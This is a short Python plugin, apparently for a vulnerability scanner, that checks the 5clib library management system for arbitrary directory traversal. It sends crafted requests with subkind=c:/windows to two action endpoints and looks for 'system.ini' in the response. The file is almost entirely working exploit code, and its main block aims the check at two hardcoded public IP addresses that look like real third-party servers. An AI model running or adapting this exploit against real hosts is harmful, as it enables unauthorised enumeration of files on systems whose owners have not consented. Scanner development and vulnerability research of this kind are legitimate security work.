#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:五车图书管系统任意文件遍历
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0128686


def assign(service,arg):
    if service=="5clib":
        return True,arg 


def  audit(arg):
    #第一处
    url=arg+"5clib/kindaction.action"
    post="filePath=&kind=music&curpage=1&actionName=&subkind=c:/windows&pagesize=20&curPage=1&toPage=1"
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==200 and "system.ini" in res:
        security_hole(url)
    #第二处
    url=arg+"5clib/kinweblistaction.action?filePath=&kind=disc&curpage=1&actionName=&subkind=c:/windows&doAction=second&pagesize=20&curPage=1&toPage="
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==200 and "system.ini" in res:
        security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('5clib','http://183.64.83.104:8081/')[1])
    audit(assign('5clib','http://222.208.6.176:8081/')[1])